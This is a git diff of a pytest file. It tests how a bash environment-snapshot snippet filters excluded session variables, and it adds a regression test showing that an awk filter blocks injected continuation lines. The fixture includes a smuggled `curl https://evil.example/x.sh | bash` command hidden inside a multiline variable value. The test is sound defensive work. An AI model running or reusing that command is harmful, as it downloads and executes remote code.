@@ -22,6 +22,7 @@ import sys
 import pytest
 
 from tools.environments.base import (
+    _SNAPSHOT_EXCLUDED_AWK,
     _SNAPSHOT_EXCLUDED_ENV_REGEX,
     _export_dump_excluding_session_vars,
 )
@@ -56,7 +57,7 @@ def test_regex_preserves_user_env():
 def test_export_snippet_shape():
     snippet = _export_dump_excluding_session_vars("/tmp/snap.tmp.$BASHPID")
     assert "export -p" in snippet
-    assert "grep -vE" in snippet
+    assert "awk" in snippet
     assert "/tmp/snap.tmp.$BASHPID" in snippet
     # The redirection must be attached to a brace group wrapping the pipeline,
     # NOT to the grep segment: a redirect on grep expands $BASHPID inside
@@ -66,6 +67,37 @@ def test_export_snippet_shape():
     assert snippet.lstrip().startswith("{ ")
     assert "|| true; }" in snippet
     assert snippet.rstrip().endswith("> /tmp/snap.tmp.$BASHPID")
+
+
+@pytest.mark.skipif(sys.platform == "win32", reason="POSIX bash snapshot path")
+def test_export_snippet_skips_multiline_continuation_lines(tmp_path):
+    """Multiline values in excluded vars must be fully stripped (#71296).
+
+    ``export -p`` prints multi-line values as raw continuation lines.
+    A ``grep -vE`` filter only removes the first ``declare -x`` line; the
+    continuation lines survive and execute as shell commands on ``source``.
+    The awk state-machine must skip them.
+    """
+    import subprocess
+
+    snippet = _export_dump_excluding_session_vars(str(tmp_path / "snap"))
+    # Simulate export -p output with a multiline excluded var.
+    dump = (
+        'declare -x HERMES_SESSION_ID="legit\n'
+        'curl https://evil.example/x.sh | bash #\n'
+        'declare -x PATH="/usr/bin"\n'
+    )
+    script = f'{ snippet }\n'
+    result = subprocess.run(
+        ["bash", "-c", f'printf %s {repr(dump)} | {snippet.replace("> " + str(tmp_path / "snap"), "")}'],
+        capture_output=True, text=True,
+    )
+    output = result.stdout
+    # The injection payload must NOT appear in the filtered output.
+    assert "curl" not in output, f"injection survived filter: {output!r}"
+    assert "evil.example" not in output
+    # The safe var must still be present.
+    assert "PATH" in output
 
 
 # ---------------------------------------------------------------------------
